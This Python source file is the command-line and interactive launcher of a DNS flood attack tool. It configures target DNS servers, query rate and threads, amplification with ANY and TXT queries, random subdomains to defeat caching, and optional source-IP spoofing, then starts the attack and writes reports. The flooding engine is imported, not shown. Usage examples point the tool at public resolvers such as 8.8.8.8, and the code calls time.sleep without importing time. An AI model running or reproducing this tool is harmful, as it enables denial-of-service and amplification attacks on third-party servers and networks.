import argparse
import sys 
from .dnsflood import DnsFlood
from .report import write_json_log, write_xml_log, write_pdf_log
from .shell import DnsFloodShell
from modules import config as conf
import os
import subprocess

PARAMS = [
    {"name": "DNS SERVERS", "key": "dns_servers", "value": "", "desc": "Comma-separated DNS server IPs (e.g., 8.8.8.8,1.1.1.1)", "required": True},
    {"name": "DURATION", "key": "duration", "value": "120", "desc": "Attack duration in seconds", "required": False},
    {"name": "QUERY RATE", "key": "query_rate", "value": "1000", "desc": "Queries per second per thread", "required": False},
    {"name": "THREADS", "key": "threads", "value": "10", "desc": "Number of attack threads", "required": False},
    {"name": "REPORT FORMAT", "key": "report_format", "value": "json", "desc": "Export format (json/xml/pdf)", "required": False},
    {"name": "AMPLIFICATION", "key": "amplification", "value": "true", "desc": "Enable amplification techniques (true/false)", "required": False},
    {"name": "USE ANY QUERIES", "key": "use_any_query", "value": "true", "desc": "Use ANY queries for maximum amplification (true/false)", "required": False},
    {"name": "USE TXT QUERIES", "key": "use_txt_query", "value": "true", "desc": "Use TXT queries for good amplification (true/false)", "required": False},
    {"name": "RANDOM SUBDOMAINS", "key": "random_subdomains", "value": "true", "desc": "Use random subdomains to bypass caching (true/false)", "required": False},
    {"name": "SPOOF SOURCE", "key": "spoof_source", "value": "false", "desc": "WARNING: Spoof source IP (ILLEGAL for real attacks)", "required": False},
    {"name": "SILENT MODE", "key": "silent", "value": "false", "desc": "Disable progress display (true/false)", "required": False},
    {"name": "VERBOSE", "key": "verbose", "value": "false", "desc": "Enable verbose output (true/false)", "required": False},
]

def parse_boolean(value):
    """Parse string to boolean"""
    if isinstance(value, bool):
        return value
    return value.lower() in ('true', 'yes', '1', 'y', 't')

def run_attack():
    """Run attack in direct terminal mode"""
    config = {p["key"]: p["value"] for p in PARAMS}
    
    try:
        duration = int(config["duration"])
        query_rate = int(config["query_rate"])
        threads = int(config["threads"])
        amplification = parse_boolean(config["amplification"])
        use_any_query = parse_boolean(config["use_any_query"])
        use_txt_query = parse_boolean(config["use_txt_query"])
        random_subdomains = parse_boolean(config["random_subdomains"])
        spoof_source = parse_boolean(config["spoof_source"])
        silent = parse_boolean(config["silent"])
        verbose = parse_boolean(config["verbose"])
        
        if not config["dns_servers"]:
            print(f"{conf.RED}[!] DNS servers are required{conf.RESET}")
            return
        
        dns_servers = [s.strip() for s in config["dns_servers"].split(',')]
        
        print(f"\n{conf.RED}{'='*60}{conf.RESET}")
        print(f"{conf.RED}{conf.BOLD} STARTING DNS FLOOD ATTACK {conf.RESET}")
        print(f"{conf.RED}{'='*60}{conf.RESET}")
        
        print(f"\n{conf.RED}Configuration:{conf.RESET}")
        print(f"  DNS Servers: {conf.GREEN}{', '.join(dns_servers)}{conf.RESET}")
        print(f"  Duration: {conf.GREEN}{duration}s{conf.RESET}")
        print(f"  Query Rate: {conf.GREEN}{query_rate} qps/thread{conf.RESET}")
        print(f"  Threads: {conf.GREEN}{threads}{conf.RESET}")
        print(f"  Amplification: {conf.GREEN if amplification else conf.RED}{amplification}{conf.RESET}")
        
        if amplification:
            print(f"  Use ANY Queries: {conf.GREEN if use_any_query else conf.RED}{use_any_query}{conf.RESET}")
            print(f"  Use TXT Queries: {conf.GREEN if use_txt_query else conf.RED}{use_txt_query}{conf.RESET}")
            print(f"  Random Subdomains: {conf.GREEN if random_subdomains else conf.RED}{random_subdomains}{conf.RESET}")
        
        print(f"  Spoof Source: {conf.RED if spoof_source else conf.GREEN}{spoof_source}{conf.RESET}")
        print(f"  Silent Mode: {conf.GREEN if silent else conf.RED}{silent}{conf.RESET}")
        print(f"  Verbose: {conf.GREEN if verbose else conf.RED}{verbose}{conf.RESET}")
        print(f"  Report Format: {conf.GREEN}{config['report_format']}{conf.RESET}")

        if spoof_source:
            print(f"\n{conf.RED}⚠️  WARNING: Source IP spoofing is ILLEGAL for real attacks!{conf.RESET}")
            print(f"{conf.RED}   Use only on your own networks with proper authorization.{conf.RESET}")
            time.sleep(3)  # Give user time to read warning

        print(f"\n{conf.YELLOW}⚠️  WARNING: This is a network testing tool. Use responsibly!{conf.RESET}")

        # Execute attack
        attacker = DnsFlood(
            dns_servers=dns_servers,
            duration=duration,
            query_rate=query_rate,
            threads=threads,
            amplification=amplification,
            spoof_source=spoof_source,
            use_any_query=use_any_query,
            use_txt_query=use_txt_query,
            random_subdomains=random_subdomains,
            silent=silent,
            verbose=verbose
        )
        
        result = attacker.start()

        # Generate report
        fmt = config["report_format"].lower()
        if fmt == "json":
            write_json_log(
                attack_type="DNS Flood",
                dns_servers=result["dns_servers"],
                duration=result["duration"],
                packets_sent=result["packets_sent"],
                failures=result["failures"],
                amplification=result.get("amplification", False),
                amplification_factor=result.get("estimated_amplification_factor", 1.0)
            )
        elif fmt == "xml":
            write_xml_log(
                attack_type="DNS Flood",
                dns_servers=result["dns_servers"],
                duration=result["duration"],
                packets_sent=result["packets_sent"],
                failures=result["failures"],
                amplification=result.get("amplification", False),
                amplification_factor=result.get("estimated_amplification_factor", 1.0)
            )
        elif fmt == "pdf":
            write_pdf_log(
                attack_type="DNS Flood",
                dns_servers=result["dns_servers"],
                duration=result["duration"],
                packets_sent=result["packets_sent"],
                failures=result["failures"],
                amplification=result.get("amplification", False),
                amplification_factor=result.get("estimated_amplification_factor", 1.0)
            )
            
    except Exception as e:
        print(f"{conf.RED}[!] Error during execution: {e}{conf.RESET}")

def InteractiveMode():
    """Launch interactive shell mode"""
    DnsFloodShell(PARAMS)

def TerminalMode():
    """Terminal mode with command-line arguments"""
    parser = argparse.ArgumentParser(
        description='DNS Flood - Network Stress Testing Tool',
        prog='dnsflood',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''Examples:
  dnsflood -d 8.8.8.8,1.1.1.1
  dnsflood -d 8.8.8.8,1.1.1.1 -t 60 -q 500
  dnsflood -d 8.8.8.8 --threads 20 --format pdf
  dnsflood -d 8.8.8.8 --no-amplification  # Disable amplification
  dnsflood -d 8.8.8.8 --amplify --any --txt --random-subdomains  # Full amplification
  dnsflood --help
        '''
    )
    
    parser.add_argument(
        '-d', '--dns', '--dns-servers',
        dest='dns_servers',
        required=True,
        help='Comma-separated list of DNS server IPs to target'
    )
    
    parser.add_argument(
        '-t', '--duration', '--time',
        type=int,
        default=120,
        help='Attack duration in seconds (default: 120)'
    )
    
    parser.add_argument(
        '-q', '--query-rate', '--rate',
        dest='query_rate',
        type=int,
        default=1000,
        help='Queries per second per thread (default: 1000)'
    )
    
    parser.add_argument(
        '--threads',
        type=int,
        default=10,
        help='Number of attack threads (default: 10)'
    )
    
    parser.add_argument(
        '-f', '--format', '--report-format',
        dest='report_format',
        choices=['json', 'xml', 'pdf'],
        default='json',
        help='Output report format (default: json)'
    )
    
    # Amplification arguments
    parser.add_argument(
        '--amplify', '--amplification',
        dest='amplification',
        action='store_true',
        help='Enable DNS amplification techniques'
    )
    
    parser.add_argument(
        '--no-amplification',
        dest='amplification',
        action='store_false',
        help='Disable DNS amplification techniques'
    )
    parser.set_defaults(amplification=True)
    
    parser.add_argument(
        '--any', '--any-queries',
        dest='use_any_query',
        action='store_true',
        help='Use ANY queries for maximum amplification'
    )
    
    parser.add_argument(
        '--no-any',
        dest='use_any_query',
        action='store_false',
        help='Disable ANY queries'
    )
    parser.set_defaults(use_any_query=True)
    
    parser.add_argument(
        '--txt', '--txt-queries',
        dest='use_txt_query',
        action='store_true',
        help='Use TXT queries for good amplification'
    )
    
    parser.add_argument(
        '--no-txt',
        dest='use_txt_query',
        action='store_false',
        help='Disable TXT queries'
    )
    parser.set_defaults(use_txt_query=True)
    
    parser.add_argument(
        '--random-subdomains',
        dest='random_subdomains',
        action='store_true',
        help='Use random subdomains to bypass caching'
    )
    
    parser.add_argument(
        '--no-random-subdomains',
        dest='random_subdomains',
        action='store_false',
        help='Disable random subdomains'
    )
    parser.set_defaults(random_subdomains=True)
    
    parser.add_argument(
        '--spoof', '--spoof-source',
        dest='spoof_source',
        action='store_true',
        help='WARNING: Spoof source IP (ILLEGAL for real attacks)'
    )
    
    parser.add_argument(
        '--silent',
        dest='silent',
        action='store_true',
        help='Disable progress display'
    )
    
    parser.add_argument(
        '--verbose',
        dest='verbose',
        action='store_true',
        help='Enable verbose output'
    )
    
    parser.add_argument(
        '--version',
        action='version',
        version='DNS Flood 1.0.0'
    )
    
    try:
        args = parser.parse_args()
    except SystemExit:
        return
    
    # Update PARAMS with command line arguments
    for param in PARAMS:
        if param['key'] == 'dns_servers':
            param['value'] = args.dns_servers
        elif param['key'] == 'duration':
            param['value'] = str(args.duration)
        elif param['key'] == 'query_rate':
            param['value'] = str(args.query_rate)
        elif param['key'] == 'threads':
            param['value'] = str(args.threads)
        elif param['key'] == 'report_format':
            param['value'] = args.report_format
        elif param['key'] == 'amplification':
            param['value'] = str(args.amplification).lower()
        elif param['key'] == 'use_any_query':
            param['value'] = str(args.use_any_query).lower()
        elif param['key'] == 'use_txt_query':
            param['value'] = str(args.use_txt_query).lower()
        elif param['key'] == 'random_subdomains':
            param['value'] = str(args.random_subdomains).lower()
        elif param['key'] == 'spoof_source':
            param['value'] = str(args.spoof_source).lower()
        elif param['key'] == 'silent':
            param['value'] = str(args.silent).lower()
        elif param['key'] == 'verbose':
            param['value'] = str(args.verbose).lower()
    
    run_attack()
    
def main():
    """Main entry point - determine mode based on arguments"""
    if len(sys.argv) > 1:
        TerminalMode()
    else:
        InteractiveMode()

if __name__ == "__main__":
    main()